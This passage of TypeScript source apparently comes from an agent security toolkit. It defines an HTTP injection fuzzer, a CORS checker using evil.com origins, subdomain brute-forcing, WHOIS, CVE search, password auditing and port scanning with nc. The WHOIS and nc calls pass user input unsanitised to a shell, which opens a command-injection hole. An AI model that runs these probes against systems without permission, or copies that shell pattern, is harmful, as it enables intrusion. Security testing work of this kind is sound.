          payloads = String(args.custom_payloads || '').split(',').map(p => p.trim()).filter(Boolean)
          if (payloads.length === 0) return 'Error: custom_payloads required when payloads="custom"'
          break
        default:
          payloads = SQLI_PAYLOADS
      }

      const lines: string[] = [
        '## HTTP Fuzzing Results',
        '',
        `**Target**: ${baseUrl}`,
        `**Method**: ${method}`,
        `**Parameter**: ${param}`,
        `**Payload type**: ${payloadType}`,
        `**Total payloads**: ${payloads.length}`,
        '',
      ]

      // First, get baseline response
      let baselineStatus = 0
      let baselineLength = 0
      let baselineTime = 0
      try {
        const start = Date.now()
        const bUrl = method === 'GET'
          ? `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${encodeURIComponent(param)}=test`
          : baseUrl
        const bOpts: RequestInit = method === 'POST'
          ? { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `${encodeURIComponent(param)}=test` }
          : {}
        const bResp = await fetchWithTimeout(bUrl, bOpts, 10000)
        baselineStatus = bResp.status
        const bBody = await bResp.text()
        baselineLength = bBody.length
        baselineTime = Date.now() - start
      } catch {
        // baseline failed, continue anyway
      }

      lines.push(`**Baseline**: status=${baselineStatus}, length=${baselineLength}, time=${baselineTime}ms`)
      lines.push('')

      // SQL error patterns
      const sqlErrors = [
        /SQL syntax/i, /mysql_fetch/i, /ORA-\d{5}/i, /pg_query/i, /sqlite3?_/i,
        /ODBC.*Driver/i, /syntax error.*SQL/i, /Unclosed quotation mark/i,
        /quoted string not properly terminated/i, /Warning.*mysql/i,
        /Microsoft.*ODBC/i, /Microsoft.*SQL.*Server/i, /PostgreSQL.*ERROR/i,
        /unterminated.*string/i, /invalid input syntax/i, /near.*syntax/i,
        /org\.hibernate/i, /javax\.persistence/i,
      ]

      // XSS reflection check
      const xssMarker = 'kbot_xss_test_marker'

      interface FuzzResult {
        payload: string
        status: number
        length: number
        time: number
        interesting: string[]
      }

      const results: FuzzResult[] = []
      const interesting: FuzzResult[] = []

      for (const payload of payloads) {
        try {
          const start = Date.now()
          let requestUrl: string
          let requestOpts: RequestInit = {}

          if (method === 'GET') {
            requestUrl = `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${encodeURIComponent(param)}=${encodeURIComponent(payload)}`
          } else {
            requestUrl = baseUrl
            requestOpts = {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
            }
          }

          const resp = await fetchWithTimeout(requestUrl, requestOpts, 10000)
          const body = await resp.text()
          const elapsed = Date.now() - start

          const flags: string[] = []

          // Check for SQL errors
          if (payloadType === 'sqli') {
            for (const pattern of sqlErrors) {
              if (pattern.test(body)) {
                flags.push('SQL error detected')
                break
              }
            }
            // Check for different response lengths (potential boolean-based blind SQLi)
            if (Math.abs(body.length - baselineLength) > baselineLength * 0.3 && baselineLength > 0) {
              flags.push(`Response length anomaly (${body.length} vs baseline ${baselineLength})`)
            }
            // Time-based detection
            if (elapsed > baselineTime + 4000) {
              flags.push(`Time anomaly (${elapsed}ms vs baseline ${baselineTime}ms) — possible time-based blind SQLi`)
            }
          }

          // Check for reflected XSS
          if (payloadType === 'xss') {
            // Check if payload is reflected without encoding
            if (body.includes(payload)) {
              flags.push('Payload reflected without encoding')
            }
            // Check for partial reflection
            const scriptTag = payload.match(/<script[^>]*>(.*?)<\/script>/i)
            if (scriptTag && body.includes(scriptTag[0])) {
              flags.push('Script tag reflected')
            }
          }

          // Path traversal indicators
          if (payloadType === 'traversal') {
            if (/root:.*:0:0/i.test(body)) flags.push('/etc/passwd content detected')
            if (/\[boot loader\]/i.test(body)) flags.push('boot.ini content detected')
            if (/\[extensions\]/i.test(body)) flags.push('Windows config content detected')
          }

          // Command injection indicators
          if (payloadType === 'command') {
            if (/uid=\d+.*gid=\d+/i.test(body)) flags.push('Command output detected (id)')
            if (/root:.*:0:0/i.test(body)) flags.push('Command output detected (passwd)')
            if (/Linux|Darwin|Windows/i.test(body) && elapsed > baselineTime + 4000) {
              flags.push('Potential command execution (timing + OS info)')
            }
          }

          // Status code anomalies
          if (resp.status === 500) flags.push('Internal Server Error (500)')
          if (resp.status === 403 && baselineStatus !== 403) flags.push('Forbidden (403) — WAF triggered?')

          const result: FuzzResult = {
            payload,
            status: resp.status,
            length: body.length,
            time: elapsed,
            interesting: flags,
          }
          results.push(result)
          if (flags.length > 0) interesting.push(result)

        } catch (e: any) {
          results.push({
            payload,
            status: 0,
            length: 0,
            time: 0,
            interesting: [`Error: ${e.message}`],
          })
        }
      }

      // Report interesting findings
      if (interesting.length > 0) {
        lines.push(`### Interesting Findings (${interesting.length}/${results.length} payloads)`)
        lines.push('')
        lines.push('| # | Payload | Status | Length | Time | Flags |')
        lines.push('|---|---------|--------|--------|------|-------|')
        for (let i = 0; i < interesting.length; i++) {
          const r = interesting[i]
          const payloadDisplay = r.payload.length > 40 ? r.payload.slice(0, 40) + '...' : r.payload
          lines.push(`| ${i + 1} | \`${payloadDisplay}\` | ${r.status} | ${r.length} | ${r.time}ms | ${r.interesting.join('; ')} |`)
        }
      } else {
        lines.push('### No Interesting Findings')
        lines.push('')
        lines.push('All payloads returned normal responses. The parameter may be properly sanitized, or the application may be using a WAF.')
      }

      lines.push('')
      lines.push(`**Summary**: Tested ${results.length} payloads, ${interesting.length} showed interesting behavior.`)

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 8. cors_check — CORS misconfiguration detection
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'cors_check',
    deprecated: true,
    description: 'Detect CORS misconfigurations. Tests for arbitrary origin reflection, null origin acceptance, credentials with wildcard, and subdomain wildcard matching.',
    parameters: {
      url: { type: 'string', description: 'URL to check for CORS misconfigurations', required: true },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const url = String(args.url).startsWith('http') ? String(args.url) : `https://${args.url}`
      const lines: string[] = [
        '## CORS Misconfiguration Check',
        '',
        `**Target**: ${url}`,
        '',
      ]

      const tests: {
        name: string
        origin: string | null
        description: string
      }[] = [
        { name: 'Arbitrary Origin Reflection', origin: 'https://evil.com', description: 'Checks if the server reflects any Origin header value' },
        { name: 'Null Origin', origin: 'null', description: 'Checks if the server accepts Origin: null (can be sent via sandboxed iframes)' },
        { name: 'Subdomain Wildcard', origin: `https://evil.${new URL(url).hostname}`, description: 'Checks if the server accepts subdomains of the target domain' },
        { name: 'HTTP Downgrade', origin: `http://${new URL(url).hostname}`, description: 'Checks if HTTPS endpoint accepts HTTP origin' },
        { name: 'Prefix Match', origin: `https://${new URL(url).hostname}.evil.com`, description: 'Checks if origin validation uses prefix matching' },
        { name: 'Suffix Match', origin: `https://evil-${new URL(url).hostname}`, description: 'Checks if origin validation uses suffix matching' },
        { name: 'Backtick Bypass', origin: `https://evil.com\`.${new URL(url).hostname}`, description: 'Checks for backtick injection in origin validation' },
      ]

      let vulnerabilities = 0

      for (const test of tests) {
        try {
          const headers: Record<string, string> = {
            'User-Agent': 'Mozilla/5.0',
          }
          if (test.origin) {
            headers['Origin'] = test.origin
          }

          const resp = await fetchWithTimeout(url, {
            method: 'OPTIONS',
            headers,
          }, 10000)

          const acao = resp.headers.get('access-control-allow-origin')
          const acac = resp.headers.get('access-control-allow-credentials')
          const acam = resp.headers.get('access-control-allow-methods')
          const acah = resp.headers.get('access-control-allow-headers')

          let vulnerable = false
          const findings: string[] = []

          if (acao === test.origin) {
            vulnerable = true
            findings.push(`Server reflects the Origin header: \`${acao}\``)
          }
          if (acao === '*' && acac === 'true') {
            vulnerable = true
            findings.push('Wildcard origin (*) with credentials allowed — browser will block but indicates misconfiguration')
          }
          if (acao === '*') {
            findings.push('Wildcard origin (*) — any site can read responses (without credentials)')
          }
          if (acac === 'true' && acao === test.origin) {
            vulnerable = true
            findings.push('Credentials allowed with reflected origin — critical vulnerability')
          }

          const status = vulnerable ? 'VULNERABLE' : (findings.length > 0 ? 'WARNING' : 'OK')
          if (vulnerable) vulnerabilities++

          lines.push(`### ${test.name} — ${status}`)
          lines.push(`_${test.description}_`)
          lines.push('')
          lines.push(`- Origin sent: \`${test.origin}\``)
          lines.push(`- ACAO: \`${acao || '(none)'}\``)
          lines.push(`- ACAC: \`${acac || '(none)'}\``)
          if (acam) lines.push(`- ACAM: \`${acam}\``)
          if (acah) lines.push(`- ACAH: \`${acah}\``)
          if (findings.length > 0) {
            for (const f of findings) lines.push(`- **${f}**`)
          }
          lines.push('')

        } catch (e: any) {
          lines.push(`### ${test.name} — ERROR`)
          lines.push(`- ${e.message}`)
          lines.push('')
        }
      }

      lines.push('---')
      lines.push(`### Summary: ${vulnerabilities} vulnerabilities found`)
      if (vulnerabilities > 0) {
        lines.push('')
        lines.push('**Impact**: CORS misconfigurations can allow attackers to read sensitive data from authenticated sessions.')
        lines.push('**Fix**: Validate origins against a strict allowlist. Never reflect arbitrary origins with credentials enabled.')
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 9. subdomain_enum — Subdomain discovery
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'subdomain_enum',
    description: 'Discover subdomains by DNS brute-forcing. Uses wordlists of 100 (small), 500 (medium), or 2000 (large) common subdomain names. Returns found subdomains with their IP addresses.',
    parameters: {
      domain: { type: 'string', description: 'Domain to enumerate subdomains for', required: true },
      wordlist: { type: 'string', description: 'Wordlist size: small (100), medium (500), large (2000)', default: 'small' },
    },
    tier: 'free',
    timeout: 300_000,
    async execute(args) {
      const domain = String(args.domain).replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim()
      const wordlistSize = String(args.wordlist || 'small')

      let wordlist: string[]
      switch (wordlistSize) {
        case 'small': wordlist = COMMON_SUBDOMAINS_SMALL; break
        case 'medium': wordlist = COMMON_SUBDOMAINS_MEDIUM; break
        case 'large': wordlist = COMMON_SUBDOMAINS_LARGE; break
        default: wordlist = COMMON_SUBDOMAINS_SMALL
      }

      // Deduplicate
      wordlist = [...new Set(wordlist)]

      const lines: string[] = [
        '## Subdomain Enumeration',
        '',
        `**Domain**: ${domain}`,
        `**Wordlist**: ${wordlistSize} (${wordlist.length} entries)`,
        '',
      ]

      const resolver = new Resolver()
      resolver.setServers(['8.8.8.8', '1.1.1.1'])

      const found: { subdomain: string; ips: string[]; ipv6?: string[] }[] = []
      const batchSize = 25
      const startTime = Date.now()

      for (let i = 0; i < wordlist.length; i += batchSize) {
        const batch = wordlist.slice(i, i + batchSize)
        const results = await Promise.allSettled(
          batch.map(async (sub) => {
            const fqdn = `${sub}.${domain}`
            const ips = await resolver.resolve4(fqdn)
            let ipv6: string[] = []
            try { ipv6 = await resolver.resolve6(fqdn) } catch { /* no AAAA */ }
            return { subdomain: fqdn, ips, ipv6 }
          })
        )
        for (const r of results) {
          if (r.status === 'fulfilled') {
            found.push(r.value)
          }
        }
      }

      const elapsed = Date.now() - startTime

      if (found.length > 0) {
        lines.push(`### Found ${found.length} subdomains (in ${(elapsed / 1000).toFixed(1)}s)`)
        lines.push('')
        lines.push('| Subdomain | IPv4 | IPv6 |')
        lines.push('|-----------|------|------|')
        for (const f of found) {
          lines.push(`| ${f.subdomain} | ${f.ips.join(', ')} | ${f.ipv6 && f.ipv6.length > 0 ? f.ipv6.join(', ') : '-'} |`)
        }

        // Group by IP to find shared hosting
        const ipMap = new Map<string, string[]>()
        for (const f of found) {
          for (const ip of f.ips) {
            const existing = ipMap.get(ip) || []
            existing.push(f.subdomain)
            ipMap.set(ip, existing)
          }
        }

        const sharedIps = [...ipMap.entries()].filter(([_, subs]) => subs.length > 1)
        if (sharedIps.length > 0) {
          lines.push('')
          lines.push('### Shared IPs (potential load balancer / shared hosting)')
          lines.push('')
          for (const [ip, subs] of sharedIps) {
            lines.push(`- **${ip}**: ${subs.join(', ')}`)
          }
        }
      } else {
        lines.push(`No subdomains found (checked ${wordlist.length} entries in ${(elapsed / 1000).toFixed(1)}s).`)
      }

      lines.push('')
      lines.push(`**Speed**: ${Math.round(wordlist.length / (elapsed / 1000))} lookups/sec`)

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 10. whois_lookup — Domain registration info
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'whois_lookup',
    description: 'Look up domain registration information using the whois command. Returns registrar, creation/expiration dates, nameservers, and registration status.',
    parameters: {
      domain: { type: 'string', description: 'Domain to look up', required: true },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const domain = String(args.domain).replace(/^https?:\/\//, '').replace(/\/.*$/, '').trim()

      const lines: string[] = [
        '## WHOIS Lookup',
        '',
        `**Domain**: ${domain}`,
        '',
      ]

      try {
        const raw = execSync(`whois ${domain} 2>/dev/null`, { maxBuffer: 1_000_000, timeout: 15000 }).toString()

        // Parse key fields
        const fields: Record<string, string> = {}
        const fieldPatterns: [string, RegExp][] = [
          ['Registrar', /Registrar:\s*(.+)/i],
          ['Registrar URL', /Registrar URL:\s*(.+)/i],
          ['Created', /Creat(?:ion|ed)\s*(?:Date)?:\s*(.+)/i],
          ['Updated', /Updated?\s*(?:Date)?:\s*(.+)/i],
          ['Expires', /Expir(?:y|ation)\s*(?:Date)?:\s*(?:Registry\s+)?(.+)/i],
          ['Status', /(?:Domain\s+)?Status:\s*(.+)/i],
          ['Registrant', /Registrant\s*(?:Name|Organization):\s*(.+)/i],
          ['Registrant Country', /Registrant\s*Country:\s*(.+)/i],
          ['Admin Email', /(?:Admin|Registrant)\s*Email:\s*(.+)/i],
          ['DNSSEC', /DNSSEC:\s*(.+)/i],
        ]

        for (const [label, pattern] of fieldPatterns) {
          const allMatches = raw.match(new RegExp(pattern.source, 'gim'))
          if (allMatches) {
            const match = allMatches[0].match(pattern)
            if (match) {
              if (label === 'Status') {
                // Collect all status lines
                const statuses = allMatches
                  .map(m => m.match(pattern)?.[1]?.trim())
                  .filter(Boolean)
                fields[label] = [...new Set(statuses)].join(', ')
              } else {
                fields[label] = match[1].trim()
              }
            }
          }
        }

        // Extract nameservers
        const nsMatches = raw.match(/Name\s*Server:\s*(.+)/gi)
        const nameservers = nsMatches
          ? [...new Set(nsMatches.map(m => m.replace(/Name\s*Server:\s*/i, '').trim().toLowerCase()))]
          : []

        if (Object.keys(fields).length > 0 || nameservers.length > 0) {
          lines.push('| Field | Value |')
          lines.push('|-------|-------|')
          for (const [key, value] of Object.entries(fields)) {
            lines.push(`| ${key} | ${value} |`)
          }
          lines.push('')

          if (nameservers.length > 0) {
            lines.push('### Nameservers')
            for (const ns of nameservers) lines.push(`- ${ns}`)
            lines.push('')
          }

          // Check expiration
          if (fields['Expires']) {
            const expDate = new Date(fields['Expires'])
            if (!isNaN(expDate.getTime())) {
              const daysLeft = Math.ceil((expDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24))
              if (daysLeft < 0) {
                lines.push(`**Warning**: Domain expired ${Math.abs(daysLeft)} days ago!`)
              } else if (daysLeft < 30) {
                lines.push(`**Warning**: Domain expires in ${daysLeft} days!`)
              }
            }
          }
        } else {
          // Show raw output if parsing failed
          lines.push('### Raw WHOIS Data')
          lines.push('```')
          lines.push(raw.slice(0, 3000))
          lines.push('```')
        }

      } catch (e: any) {
        lines.push(`**Error**: whois command failed — ${e.message}`)
        lines.push('Make sure the `whois` command is installed on this system.')
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 11. exploit_search — Search for known exploits
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'exploit_search',
    deprecated: true,
    description: 'Search for known exploits and CVEs. Queries the NVD (National Vulnerability Database) API for CVE data. Returns CVE IDs, descriptions, CVSS scores, and references.',
    parameters: {
      query: { type: 'string', description: 'CVE ID (e.g., CVE-2024-1234), software name, or keyword', required: true },
      source: { type: 'string', description: 'Source: nist, cve, all', default: 'all' },
    },
    tier: 'free',
    timeout: 30_000,
    async execute(args) {
      const query = String(args.query).trim()

      const lines: string[] = [
        '## Exploit / CVE Search',
        '',
        `**Query**: ${query}`,
        '',
      ]

      // Check if it's a CVE ID
      const isCVE = /^CVE-\d{4}-\d{4,}$/i.test(query)

      try {
        let apiUrl: string
        if (isCVE) {
          apiUrl = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(query.toUpperCase())}`
        } else {
          apiUrl = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}&resultsPerPage=20`
        }

        const resp = await fetchWithTimeout(apiUrl, {
          headers: { 'Accept': 'application/json' },
        }, 20000)

        if (!resp.ok) {
          lines.push(`**NVD API returned**: ${resp.status} ${resp.statusText}`)
          if (resp.status === 403) {
            lines.push('Note: NVD API may be rate-limited. Try again in a few seconds.')
          }
          return lines.join('\n')
        }

        const data = await resp.json() as any
        const vulns = data.vulnerabilities || []

        if (vulns.length === 0) {
          lines.push('No results found in the National Vulnerability Database.')
          return lines.join('\n')
        }

        lines.push(`**Results**: ${data.totalResults || vulns.length} total (showing ${vulns.length})`)
        lines.push('')

        for (const vuln of vulns) {
          const cve = vuln.cve
          const id = cve.id
          const description = cve.descriptions?.find((d: any) => d.lang === 'en')?.value || 'No description'

          // CVSS score
          let cvssScore = 'N/A'
          let severity = 'N/A'
          let cvssVector = ''

          // Try CVSS 3.1 first, then 3.0, then 2.0
          const metrics = cve.metrics || {}
          const cvss31 = metrics.cvssMetricV31?.[0]?.cvssData
          const cvss30 = metrics.cvssMetricV30?.[0]?.cvssData
          const cvss2 = metrics.cvssMetricV2?.[0]?.cvssData

          if (cvss31) {
            cvssScore = String(cvss31.baseScore)
            severity = cvss31.baseSeverity || 'N/A'
            cvssVector = cvss31.vectorString || ''
          } else if (cvss30) {
            cvssScore = String(cvss30.baseScore)
            severity = cvss30.baseSeverity || 'N/A'
            cvssVector = cvss30.vectorString || ''
          } else if (cvss2) {
            cvssScore = String(cvss2.baseScore)
            severity = cvss2.baseSeverity || 'N/A'
            cvssVector = cvss2.vectorString || ''
          }

          const published = cve.published ? new Date(cve.published).toISOString().split('T')[0] : 'N/A'
          const modified = cve.lastModified ? new Date(cve.lastModified).toISOString().split('T')[0] : 'N/A'

          lines.push(`### ${id}`)
          lines.push('')
          lines.push(`**CVSS**: ${cvssScore} (${severity})${cvssVector ? ` — \`${cvssVector}\`` : ''}`)
          lines.push(`**Published**: ${published} | **Modified**: ${modified}`)
          lines.push('')
          lines.push(description.length > 500 ? description.slice(0, 500) + '...' : description)
          lines.push('')

          // CWE
          const weaknesses = cve.weaknesses || []
          const cwes = weaknesses
            .flatMap((w: any) => w.description || [])
            .filter((d: any) => d.lang === 'en')
            .map((d: any) => d.value)
          if (cwes.length > 0) {
            lines.push(`**CWE**: ${cwes.join(', ')}`)
          }

          // References (show top 5)
          const refs = (cve.references || []).slice(0, 5)
          if (refs.length > 0) {
            lines.push('**References**:')
            for (const ref of refs) {
              const tags = ref.tags?.length ? ` [${ref.tags.join(', ')}]` : ''
              lines.push(`  - ${ref.url}${tags}`)
            }
          }

          lines.push('')
          lines.push('---')
          lines.push('')
        }

      } catch (e: any) {
        lines.push(`**Error**: ${e.message}`)
        lines.push('')
        lines.push('If the NVD API is unavailable, try searching directly at https://nvd.nist.gov/vuln/search')
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 12. password_audit — Password strength analysis
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'password_audit',
    description: 'Analyze password strength. Checks length, complexity, entropy, common patterns (keyboard walks, dates, dictionary words), and estimated crack time. Optionally checks Have I Been Pwned (HIBP) breach database using k-anonymity.',
    parameters: {
      password: { type: 'string', description: 'Password to audit', required: true },
      check_breach: { type: 'string', description: 'Check HIBP breach database (true/false)', default: 'true' },
    },
    tier: 'free',
    timeout: 15_000,
    async execute(args) {
      const password = String(args.password)
      const checkBreach = String(args.check_breach) !== 'false'

      const lines: string[] = [
        '## Password Strength Audit',
        '',
        `**Password**: \`${'*'.repeat(password.length)}\` (${password.length} characters)`,
        '',
      ]

      // Character class analysis
      const hasLower = /[a-z]/.test(password)
      const hasUpper = /[A-Z]/.test(password)
      const hasDigit = /[0-9]/.test(password)
      const hasSpecial = /[^a-zA-Z0-9]/.test(password)
      const charClasses = [hasLower, hasUpper, hasDigit, hasSpecial].filter(Boolean).length

      lines.push('### Character Classes')
      lines.push(`- Lowercase: ${hasLower ? 'Yes' : 'No'}`)
      lines.push(`- Uppercase: ${hasUpper ? 'Yes' : 'No'}`)
      lines.push(`- Digits: ${hasDigit ? 'Yes' : 'No'}`)
      lines.push(`- Special: ${hasSpecial ? 'Yes' : 'No'}`)
      lines.push(`- **Classes used**: ${charClasses}/4`)
      lines.push('')

      // Entropy
      const entropy = calculatePasswordEntropy(password)
      lines.push('### Entropy')
      lines.push(`- **Bits of entropy**: ${entropy.toFixed(1)}`)
      lines.push(`- **Estimated crack time**: ${estimateCrackTime(entropy)} (10B guesses/sec)`)
      lines.push('')

      // Common patterns
      const patterns: string[] = []

      // Keyboard walks
      const keyboardRows = ['qwertyuiop', 'asdfghjkl', 'zxcvbnm', '1234567890']
      for (const row of keyboardRows) {
        for (let len = 4; len <= row.length; len++) {
          for (let i = 0; i <= row.length - len; i++) {
            const seq = row.slice(i, i + len)
            if (password.toLowerCase().includes(seq)) {
              patterns.push(`Keyboard walk: "${seq}"`)
            }
            // Reverse
            const rev = seq.split('').reverse().join('')
            if (password.toLowerCase().includes(rev)) {
              patterns.push(`Reversed keyboard walk: "${rev}"`)
            }
          }
        }
      }

      // Sequential digits/letters
      for (let len = 4; len <= 8; len++) {
        for (let start = 0; start <= 9 - len; start++) {
          const seq = Array.from({ length: len }, (_, i) => String(start + i)).join('')
          if (password.includes(seq)) patterns.push(`Sequential digits: "${seq}"`)
        }
      }

      // Repeated characters
      if (/(.)\1{3,}/.test(password)) {
        const match = password.match(/(.)\1{3,}/)
        if (match) patterns.push(`Repeated character: "${match[0]}"`)
      }

      // Date patterns
      if (/(?:19|20)\d{2}[-/]?\d{2}[-/]?\d{2}/.test(password)) {
        patterns.push('Contains date pattern (YYYY-MM-DD)')
      }
      if (/\d{2}[-/]\d{2}[-/](?:19|20)\d{2}/.test(password)) {
        patterns.push('Contains date pattern (MM/DD/YYYY)')
      }

      // Common word check
      const lowerPass = password.toLowerCase()
      const foundWords = COMMON_PASSWORDS.filter(w => lowerPass.includes(w) && w.length >= 4).slice(0, 5)
      if (foundWords.length > 0) {
        patterns.push(`Contains common password words: ${foundWords.map(w => `"${w}"`).join(', ')}`)
      }

      // L33t speak detection
      const l33tMap: Record<string, string> = { '4': 'a', '@': 'a', '3': 'e', '1': 'i', '!': 'i', '0': 'o', '5': 's', '$': 's', '7': 't', '+': 't' }
      let dl33ted = lowerPass
      for (const [k, v] of Object.entries(l33tMap)) {
        dl33ted = dl33ted.split(k).join(v)
      }
      if (dl33ted !== lowerPass) {
        const l33tWords = COMMON_PASSWORDS.filter(w => dl33ted.includes(w) && w.length >= 4).slice(0, 3)
        if (l33tWords.length > 0) {
          patterns.push(`L33t-speak detected (de-l33ted: "${dl33ted}"): matches ${l33tWords.map(w => `"${w}"`).join(', ')}`)
        }
      }

      if (patterns.length > 0) {
        lines.push('### Weaknesses Detected')
        for (const p of patterns) lines.push(`- ${p}`)
        lines.push('')
      } else {
        lines.push('### No Common Patterns Detected')
        lines.push('')
      }

      // HIBP check
      if (checkBreach) {
        lines.push('### Have I Been Pwned Check')
        try {
          const sha1 = createHash('sha1').update(password).digest('hex').toUpperCase()
          const prefix = sha1.slice(0, 5)
          const suffix = sha1.slice(5)

          const resp = await fetchWithTimeout(`https://api.pwnedpasswords.com/range/${prefix}`, {
            headers: { 'User-Agent': 'kbot-password-audit' },
          }, 10000)

          if (resp.ok) {
            const text = await resp.text()
            const hashLines = text.split('\n')
            let breachCount = 0

            for (const line of hashLines) {
              const [hashSuffix, count] = line.trim().split(':')
              if (hashSuffix === suffix) {
                breachCount = parseInt(count, 10)
                break
              }
            }

            if (breachCount > 0) {
              lines.push(`- **BREACHED**: This password appeared **${breachCount.toLocaleString()} times** in data breaches!`)
              lines.push('- **Action**: Change this password immediately.')
            } else {
              lines.push('- **Not found** in known data breaches (k-anonymity check passed).')
            }
          } else {
            lines.push(`- HIBP API returned ${resp.status} — check skipped.`)
          }
        } catch (e: any) {
          lines.push(`- HIBP check failed: ${e.message}`)
        }
        lines.push('')
      }

      // Overall score
      let score = 0
      if (password.length >= 8) score += 1
      if (password.length >= 12) score += 1
      if (password.length >= 16) score += 1
      if (charClasses >= 3) score += 1
      if (charClasses >= 4) score += 1
      if (entropy >= 40) score += 1
      if (entropy >= 60) score += 1
      if (entropy >= 80) score += 1
      if (patterns.length === 0) score += 1
      if (foundWords.length === 0) score += 1

      const maxScore = 10
      const rating = score <= 2 ? 'Very Weak' : score <= 4 ? 'Weak' : score <= 6 ? 'Moderate' : score <= 8 ? 'Strong' : 'Very Strong'

      lines.push('### Overall Rating')
      lines.push(`**Score**: ${score}/${maxScore} — **${rating}**`)
      lines.push('')

      // Recommendations
      const recs: string[] = []
      if (password.length < 12) recs.push('Increase length to at least 12 characters')
      if (charClasses < 3) recs.push('Use at least 3 character classes (upper, lower, digit, special)')
      if (patterns.length > 0) recs.push('Avoid common patterns, keyboard walks, and dictionary words')
      if (entropy < 60) recs.push('Consider using a passphrase (4+ random words) for better entropy')
      recs.push('Use a password manager to generate and store unique passwords')

      if (recs.length > 0) {
        lines.push('### Recommendations')
        for (const r of recs) lines.push(`- ${r}`)
      }

      return lines.join('\n')
    },
  })

  // ─────────────────────────────────────────────────────────────────────────────
  // 13. attack_surface — Map attack surface
  // ─────────────────────────────────────────────────────────────────────────────

  registerTool({
    name: 'attack_surface',
    description: 'Map the attack surface of a target. Combines DNS records, common open ports, HTTP methods, technology stack, security headers, and exposed paths into a comprehensive attack surface map.',
    parameters: {
      target: { type: 'string', description: 'URL or domain to map', required: true },
    },
    tier: 'free',
    timeout: 120_000,
    async execute(args) {
      const rawTarget = String(args.target).trim()
      const domain = rawTarget.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/:.*$/, '')
      const url = rawTarget.startsWith('http') ? rawTarget : `https://${rawTarget}`

      const lines: string[] = [
        '## Attack Surface Map',
        '',
        `**Target**: ${domain}`,
        `**URL**: ${url}`,
        `**Scanned at**: ${new Date().toISOString()}`,
        '',
      ]

      // 1. DNS Records
      lines.push('### 1. DNS Records')
      const resolver = new Resolver()
      resolver.setServers(['8.8.8.8', '1.1.1.1'])

      const dnsResults: Record<string, any> = {}
      const dnsChecks = [
        { type: 'A', fn: () => resolver.resolve4(domain) },
        { type: 'AAAA', fn: () => resolver.resolve6(domain) },
        { type: 'MX', fn: () => resolver.resolveMx(domain) },
        { type: 'NS', fn: () => resolver.resolveNs(domain) },
        { type: 'TXT', fn: () => resolver.resolveTxt(domain) },
      ]

      for (const check of dnsChecks) {
        try {
          dnsResults[check.type] = await check.fn()
        } catch { /* skip */ }
      }

      if (dnsResults['A']) lines.push(`- **A**: ${dnsResults['A'].join(', ')}`)
      if (dnsResults['AAAA']) lines.push(`- **AAAA**: ${dnsResults['AAAA'].join(', ')}`)
      if (dnsResults['MX']) lines.push(`- **MX**: ${dnsResults['MX'].map((m: any) => `${m.exchange} (pri ${m.priority})`).join(', ')}`)
      if (dnsResults['NS']) lines.push(`- **NS**: ${dnsResults['NS'].join(', ')}`)
      if (dnsResults['TXT']) {
        for (const txt of dnsResults['TXT']) {
          const val = txt.join('')
          // Flag interesting TXT records
          if (/v=spf|dkim|dmarc|verification|google-site|ms=|facebook/i.test(val)) {
            lines.push(`- **TXT**: \`${val.slice(0, 100)}\``)
          }
        }
      }
      lines.push('')

      // 2. Port Check (using fetch to common ports)
      lines.push('### 2. Port Scan (Common Ports)')
      const ports = [
        { port: 80, service: 'HTTP' },
        { port: 443, service: 'HTTPS' },
        { port: 8080, service: 'HTTP-Alt' },
        { port: 8443, service: 'HTTPS-Alt' },
        { port: 22, service: 'SSH' },
        { port: 21, service: 'FTP' },
        { port: 3306, service: 'MySQL' },
        { port: 5432, service: 'PostgreSQL' },
        { port: 27017, service: 'MongoDB' },
        { port: 6379, service: 'Redis' },
      ]

      const portResults: { port: number; service: string; open: boolean }[] = []
      const portChecks = ports.map(async (p) => {
        try {
          // Try TCP connection via fetch for HTTP ports, or just check if it responds
          if (p.port === 80 || p.port === 443 || p.port === 8080 || p.port === 8443) {
            const proto = p.port === 443 || p.port === 8443 ? 'https' : 'http'
            const resp = await fetchWithTimeout(`${proto}://${domain}:${p.port}/`, {}, 5000)
            return { ...p, open: true }
          } else {
            // For non-HTTP ports, try a raw connection test via command
            try {
              execSync(`nc -z -w 3 ${domain} ${p.port} 2>/dev/null`, { timeout: 5000 })
              return { ...p, open: true }
            } catch {
              return { ...p, open: false }
            }
          }
        } catch {
          return { ...p, open: false }
        }
      })

      const portScanResults = await Promise.allSettled(portChecks)
      for (const r of portScanResults) {
        if (r.status === 'fulfilled') portResults.push(r.value)
      }

      const openPorts = portResults.filter(p => p.open)
      if (openPorts.length > 0) {
        lines.push('| Port | Service | Status |')
        lines.push('|------|---------|--------|')
        for (const p of portResults) {
          lines.push(`| ${p.port} | ${p.service} | ${p.open ? 'OPEN' : 'closed'} |`)
        }
      } else {
        lines.push('No common ports responded (may be filtered by firewall).')
      }
      lines.push('')

      // 3. HTTP Methods
      lines.push('### 3. HTTP Methods')
      const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
      const allowedMethods: string[] = []

      for (const method of methods) {
        try {
          const resp = await fetchWithTimeout(url, { method }, 5000)
